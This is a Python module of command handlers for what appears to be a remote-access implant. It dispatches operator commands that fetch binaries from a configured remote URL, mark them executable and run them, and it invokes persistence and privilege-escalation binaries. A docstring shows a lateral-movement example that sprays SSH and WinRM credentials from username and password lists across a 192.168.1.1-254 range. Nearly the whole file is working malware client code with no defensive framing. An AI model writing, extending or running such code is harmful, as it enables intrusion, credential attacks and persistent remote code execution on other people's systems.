"""Plugin handlers for special commands"""

import subprocess
import os
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime

import config   # Import centralized configuration


def log_event(message: str):
    """Append log entry to log.txt with timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(config.LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {message}\n")
    except Exception:
        pass  # Fail silently if logging fails


def ensure_on_demand_directory():
    """Create the on-demand plugins directory."""
    os.makedirs(config.ON_DEMAND_DIR, exist_ok=True)


# ====================== LATERAL MOVEMENT ======================

def lateral_movement_binary(binary_path: str = None, args: list = None, output_file: str = "lateral_output.txt") -> str:
    """
    Run lateral movement binary with arguments.
    Uses default binary from config if none provided.
    """
    if args is None:
        args = []
    
    # Use default binary from config if not specified
    if not binary_path:
        binary_path = config.LATERAL_MOVEMENT_BINARY

    try:
        command = [binary_path] + args
        output_path = Path(output_file)

        print(f"[Lateral] Running: {' '.join(command)}")
        log_event(f"Lateral movement started → {' '.join(command)}")

        with open(output_path, "w", encoding="utf-8") as outfile:
            result = subprocess.run(
                command,
                stdout=outfile,
                stderr=subprocess.PIPE,
                text=True,
                timeout=90
            )

        if result.returncode != 0:
            error_msg = f"Binary failed with code {result.returncode}: {result.stderr.strip()}"
            log_event(f"Lateral movement failed: {error_msg}")
            return error_msg

        content = output_path.read_text(encoding="utf-8")
        log_event(f"Lateral movement completed. Output saved to {output_file}")
        return content

    except FileNotFoundError:
        msg = f"Binary not found: {binary_path}"
        log_event(f"Lateral movement error: {msg}")
        return msg
    except subprocess.TimeoutExpired:
        msg = "Lateral movement timed out after 90 seconds"
        log_event(f"Lateral movement error: {msg}")
        return msg
    except Exception as e:
        msg = f"Error in lateral_movement: {e}"
        log_event(f"Lateral movement error: {msg}")
        return msg


# ====================== OTHER PLUGIN HANDLERS ======================

def handle_plugin_download(command: str) -> str:
    """Handle: plugin_download:filename"""
    try:
        _, filename = command.split(":", 1)
        filename = filename.strip()
        if not filename:
            return "ERROR: No filename provided after plugin_download:"

        ensure_on_demand_directory()
        download_url = config.DOWNLOAD_BASE_URL + filename
        save_path = os.path.normpath(os.path.join(config.ON_DEMAND_DIR, filename))

        log_event(f"Downloading plugin: {filename} from {download_url}")

        urllib.request.urlretrieve(download_url, save_path)
        os.chmod(save_path, 0o755)

        log_event(f"Plugin downloaded successfully: {filename}")
        return f"Plugin downloaded successfully: {filename}"

    except Exception as e:
        log_event(f"Download failed: {e}")
        return f"ERROR: Download failed - {e}"


def handle_plugin_run(command: str) -> str:
    """Handle: plugin_run:filename"""
    try:
        _, filename = command.split(":", 1)
        filename = filename.strip()
        if not filename:
            return "ERROR: No filename provided after plugin_run:"

        ensure_on_demand_directory()
        binary_path = os.path.normpath(os.path.join(config.ON_DEMAND_DIR, filename))

        if not os.path.isfile(binary_path):
            return f"ERROR: Binary not found: {binary_path}"

        log_event(f"Running on-demand plugin: {filename}")

        result = subprocess.run(
            [binary_path],
            capture_output=True,
            text=True,
            check=True,
            timeout=60
        )
        log_event(f"Plugin run completed: {filename}")
        return f"Plugin executed successfully: {filename}\n{result.stdout}"

    except Exception as e:
        log_event(f"Plugin run failed: {e}")
        return f"ERROR: {e}"


def handle_persist_command() -> str:
    """Handle persist command."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    binary_path = os.path.normpath(os.path.join(script_dir, config.PERSIST_BINARY))
    try:
        subprocess.run([binary_path], capture_output=True, text=True, check=True)
        return "Persisted on startup"
    except Exception as e:
        return f"Error persisting: {e}"


def handle_priv_esc_command() -> str:
    """Handle privilege escalation command."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    binary_path = os.path.normpath(os.path.join(script_dir, config.PRIV_ESC_BINARY))
    try:
        subprocess.run([binary_path], capture_output=True, text=True, check=True)
        return "Priv esc successful"
    except Exception as e:
        return f"Error during priv esc: {e}"


# ====================== COMMAND DISPATCHER ======================

def is_special_command(command: str) -> bool:
    """Check if command should be handled by plugins."""
    cmd = command.lower()
    return any(cmd.startswith(prefix) for prefix in [
        "persist", "priv_esc", "plugin_download", "plugin_run", "lateral_movement"
    ])


def execute_special_command(command: str) -> str:
    """Main dispatcher with logging."""
    log_event(f"execute_special_command called with: {command}")

    cmd_lower = command.lower()

    if cmd_lower.startswith("plugin_download"):
        return handle_plugin_download(command)

    elif cmd_lower.startswith("plugin_run"):
        return handle_plugin_run(command)

    elif cmd_lower.startswith("lateral_movement"):
        '''
        How to Use Lateral Movement Now:

        Using default binary (recommended):textlateral_movement:-pr:ssh winrm:-uf:username.txt:-pf:password.txt:192.168.1.1-254
        Using custom binary:textlateral_movement:./custom_tool:-t:targetlist.txt
        '''
        try:
            # Format: lateral_movement:binary_path:arg1:arg2:arg3...
            parts = command.split(":", 1)
            if len(parts) < 2:
                # Use default binary from config with no args
                return lateral_movement_binary()

            arg_string = parts[1].strip()
            arg_list = [x.strip() for x in arg_string.split(":") if x.strip()]

            if not arg_list:
                return lateral_movement_binary()

            binary_path = arg_list[0] if arg_list[0] else None
            args = arg_list[1:] if len(arg_list) > 1 else []

            return lateral_movement_binary(binary_path=binary_path, args=args)

        except Exception as e:
            log_event(f"Failed to parse lateral_movement: {e}")
            return f"ERROR parsing lateral_movement command: {e}"

    elif cmd_lower.startswith("persist"):
        return handle_persist_command()

    elif cmd_lower.startswith("priv_esc"):
        return handle_priv_esc_command()

    return "Unknown special command"